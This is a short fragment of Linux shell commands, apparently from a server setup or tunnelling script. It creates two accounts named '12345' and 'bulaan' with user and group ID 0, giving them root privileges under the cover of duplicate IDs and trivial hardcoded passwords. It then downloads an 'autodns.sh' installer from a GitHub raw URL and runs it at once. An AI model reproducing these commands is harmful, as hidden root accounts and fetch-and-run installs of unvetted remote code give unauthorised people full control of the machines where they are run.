...
useradd -p $(openssl passwd -1 bulaan) 12345 -ou 0 -g 0
useradd -p $(openssl passwd -1 12345) bulaan -ou 0 -g 0
...
wget -O autodns.sh "https://raw.githubusercontent.com/BadBoy-Dexter/Slowdns/server_script/installer/auto/autodns.sh" && chmod +x autodns.sh && sed -i -e 's/\r$//' ~/autodns.sh && ./autodns.sh
